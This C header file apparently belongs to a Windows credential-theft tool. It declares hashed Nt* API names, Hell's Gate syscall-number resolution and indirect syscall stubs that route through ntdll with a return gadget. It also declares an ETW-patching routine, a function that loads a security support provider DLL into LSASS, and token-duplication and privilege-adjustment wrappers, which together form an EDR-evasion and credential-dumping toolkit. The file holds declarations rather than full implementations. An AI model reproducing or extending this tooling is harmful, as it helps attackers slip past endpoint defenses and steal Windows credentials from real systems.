#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>
#include "ntdefs.h"

/* DJB2 hashes of Nt* function names */
#define H_NtOpenProcess              0x5003C058
#define H_NtClose                    0x8B8E133D
#define H_NtQueryVirtualMemory       0xE39D8E5D
#define H_NtReadVirtualMemory        0xC24062E3
#define H_NtQueryInformationProcess  0xD034FC62
#define H_NtCreateFile               0x15A5ECDB
#define H_NtWriteFile                0xD69326B2
#define H_NtAllocateVirtualMemory    0x6793C34C
#define H_NtFreeVirtualMemory        0x471AA7E9
#define H_NtSetInformationFile       0x6E88B479
#define H_NtTerminateProcess         0x1703AB2F
#define H_NtReadFile                 0x2E979AE3
#define H_NtFlushBuffersFile         0x832E7ED6
#define H_NtOpenKey                  0x4BB73E02
#define H_NtQueryKey                 0x1C670286
#define H_NtQueryValueKey            0xB4C18A83
#define H_NtEnumerateKey             0x6A5E8ED6
#define H_NtOpenProcessToken         0x7BD07459
#define H_NtAdjustPrivilegesToken    0x6921F9CD
#define H_NtGetNextProcess           0x62B37525
#define H_NtCreateProcessEx          0xA9E925B7
#define H_NtDuplicateToken           0x3000ECC3
#define H_NtDuplicateObject          0x2388EE19
#define H_NtSetInformationThread     0x54212E31
#define H_NtDelayExecution           0x0A49084A
#define H_NtCreateUserProcess        0x5F8E4559
#define H_NtWaitForSingleObject      0x4C6DC63C
#define H_RtlCreateProcessParametersEx   0x19132CBB
#define H_RtlDestroyProcessParameters    0xE916BC14
#define H_RtlReportSilentProcessExit     0xA262E05B

#define H_NtProtectVirtualMemory     0x082962C8
#define H_NtDeviceIoControlFile      0xA40C4BD0
#define H_NtQuerySystemInformation   0xEE4F73A8
#define H_EtwEventWrite              0x24A8D022
#define H_AddSecurityPackageW        0x5A913429

#define H_LdrLoadDll                    0x0307DB23
#define H_StartServiceCtrlDispatcherW   0x88F0D677
#define H_RegisterServiceCtrlHandlerW   0x65925C45
#define H_SetServiceStatus              0x908AD246

/* Syscall numbers (resolved at runtime via Hell's Gate) */
typedef struct _SYSCALL_TABLE {
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtQueryVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtQueryInformationProcess;
    DWORD NtCreateFile;
    DWORD NtWriteFile;
    DWORD NtReadFile;
    DWORD NtAllocateVirtualMemory;
    DWORD NtFreeVirtualMemory;
    DWORD NtSetInformationFile;
    DWORD NtTerminateProcess;
    DWORD NtFlushBuffersFile;
    DWORD NtOpenKey;
    DWORD NtQueryKey;
    DWORD NtQueryValueKey;
    DWORD NtEnumerateKey;
    DWORD NtOpenProcessToken;
    DWORD NtAdjustPrivilegesToken;
    DWORD NtGetNextProcess;
    DWORD NtCreateProcessEx;
    DWORD NtDuplicateToken;
    DWORD NtDuplicateObject;
    DWORD NtSetInformationThread;
    DWORD NtDelayExecution;
    DWORD NtCreateUserProcess;
    DWORD NtWaitForSingleObject;
    DWORD NtProtectVirtualMemory;
    DWORD NtDeviceIoControlFile;
    DWORD NtQuerySystemInformation;
} SYSCALL_TABLE;

/* Address of `syscall` instruction in ntdll (for indirect calls) */
typedef struct _SYSCALL_ADDR_TABLE {
    PVOID NtOpenProcess;
    PVOID NtClose;
    PVOID NtQueryVirtualMemory;
    PVOID NtReadVirtualMemory;
    PVOID NtQueryInformationProcess;
    PVOID NtCreateFile;
    PVOID NtWriteFile;
    PVOID NtReadFile;
    PVOID NtAllocateVirtualMemory;
    PVOID NtFreeVirtualMemory;
    PVOID NtSetInformationFile;
    PVOID NtTerminateProcess;
    PVOID NtFlushBuffersFile;
    PVOID NtOpenKey;
    PVOID NtQueryKey;
    PVOID NtQueryValueKey;
    PVOID NtEnumerateKey;
    PVOID NtOpenProcessToken;
    PVOID NtAdjustPrivilegesToken;
    PVOID NtGetNextProcess;
    PVOID NtCreateProcessEx;
    PVOID NtDuplicateToken;
    PVOID NtDuplicateObject;
    PVOID NtSetInformationThread;
    PVOID NtDelayExecution;
    PVOID NtCreateUserProcess;
    PVOID NtWaitForSingleObject;
    PVOID NtProtectVirtualMemory;
    PVOID NtDeviceIoControlFile;
    PVOID NtQuerySystemInformation;
    PVOID RtlReportSilentProcessExit;
    PVOID EtwEventWrite;
    PVOID RtlCreateProcessParametersEx;
    PVOID RtlDestroyProcessParameters;
    PVOID LdrLoadDll;
    PVOID pfnStartDispatcher;
    PVOID pfnRegHandler;
    PVOID pfnSetStatus;
} SYSCALL_ADDR_TABLE;

extern SYSCALL_TABLE g_ssn;
extern SYSCALL_ADDR_TABLE g_addr;
extern PVOID g_ret_gadget;

BOOL resolve_syscalls(void);
BOOL resolve_service_funcs(void);
BOOL load_ssp_into_lsass(const wchar_t *dll_path);

/* Indirect syscall stubs (defined in syscalls_gas.S / syscalls.asm)
 * Each variant shifts N stack slots to fix the +0x10 offset from
 * the 2 extra C params (SSN, addr). Use the one matching NT_args - 4. */
extern NTSTATUS indirect_syscall(DWORD ssn, PVOID syscall_addr, ...);
extern NTSTATUS indirect_syscall_s2(DWORD ssn, PVOID syscall_addr, ...);
extern NTSTATUS indirect_syscall_s7(DWORD ssn, PVOID syscall_addr, ...);
extern NTSTATUS indirect_syscall_s10(DWORD ssn, PVOID syscall_addr, ...);

/* ── Typed wrappers ───────────────────────────────────────── */

NTSTATUS sys_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);

NTSTATUS sys_NtClose(HANDLE Handle);

NTSTATUS sys_NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
    DWORD MemoryInformationClass, PVOID MemoryInformation,
    SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);

NTSTATUS sys_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);

NTSTATUS sys_NtQueryInformationProcess(HANDLE ProcessHandle,
    DWORD ProcessInformationClass, PVOID ProcessInformation,
    ULONG ProcessInformationLength, PULONG ReturnLength);

NTSTATUS sys_NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess,
    ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

NTSTATUS sys_NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer,
    ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);

NTSTATUS sys_NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer,
    ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);

NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

NTSTATUS sys_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
    PSIZE_T RegionSize, ULONG FreeType);

NTSTATUS sys_NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation, ULONG Length, DWORD FileInformationClass);

NTSTATUS sys_NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);

NTSTATUS sys_NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock);

NTSTATUS sys_NtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS sys_NtQueryKey(HANDLE KeyHandle, ULONG KeyInformationClass,
    PVOID KeyInformation, ULONG Length, PULONG ResultLength);

NTSTATUS sys_NtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName,
    ULONG KeyValueInformationClass, PVOID KeyValueInformation,
    ULONG Length, PULONG ResultLength);

NTSTATUS sys_NtEnumerateKey(HANDLE KeyHandle, ULONG Index,
    ULONG KeyInformationClass, PVOID KeyInformation,
    ULONG Length, PULONG ResultLength);

NTSTATUS sys_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    PHANDLE TokenHandle);

NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
    PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);

NTSTATUS sys_NtGetNextProcess(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle);

NTSTATUS sys_NtCreateProcessEx(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags,
    HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort,
    ULONG InJob);

NTSTATUS sys_NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
    TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);

NTSTATUS sys_NtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle,
    HANDLE TargetProcessHandle, PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);

NTSTATUS sys_NtSetInformationThread(HANDLE ThreadHandle,
    DWORD ThreadInformationClass, PVOID ThreadInformation,
    ULONG ThreadInformationLength);

NTSTATUS sys_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

NTSTATUS sys_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

NTSTATUS sys_NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event,
    PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength,
    PVOID OutputBuffer, ULONG OutputBufferLength);

NTSTATUS sys_NtQuerySystemInformation(ULONG SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength,
    PULONG ReturnLength);

void patch_etw(void);

/* PEB helpers */
PVOID get_peb(void);
PUNICODE_STRING get_command_line(void);
PUNICODE_STRING get_image_path(void);
DWORD get_os_build(void);
DWORD get_os_major(void);
DWORD get_os_minor(void);
DWORD get_tick(void);

#endif /* SYSCALLS_H */
